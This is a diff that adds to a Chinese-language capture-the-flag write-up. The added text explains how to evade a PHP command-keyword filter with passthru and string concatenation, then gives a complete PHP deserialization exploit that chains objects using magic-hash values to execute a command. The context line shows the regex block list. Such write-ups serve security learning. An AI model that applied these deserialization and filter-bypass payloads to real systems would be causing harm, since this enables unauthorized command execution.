@@ -135,4 +135,44 @@ if (!preg_match("/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i", 
     $result->end($this->end);  
 }
 ```
-这里要执行命令了，禁了`system`，我们首先选择有回显的`passthru`,
+这里要执行命令了，禁了`system`，我们首先选择有回显的`passthru`,绕过字符串就用字符串拼接就好了`passthru('l'.'s');` 
+
+完整exp：
+```php
+<?php  
+  
+Class Start  
+{  
+    public $ishero;  
+    public $adventure;  
+}  
+  
+class Sword  
+{  
+    public $test1;  
+    public $test2;  
+    public $go;  
+}  
+  
+class Mon3tr  
+{  
+    private $result;  
+    public $end;  
+}  
+  
+class Treasure  
+{  
+
+}  
+  
+$Star = new Start();  
+$Star->ishero = "nohero";  
+$Sword = new Sword();  
+$Star->adventure = $Sword;  
+$Sword->test1 = "QNKCDZO";  
+$Sword->test2 = "240610708";  
+$Sword->go = new Mon3tr();  
+$Sword->go->end = "passthru('l'.'s');";  
+   
+echo serialize($Star);
+```
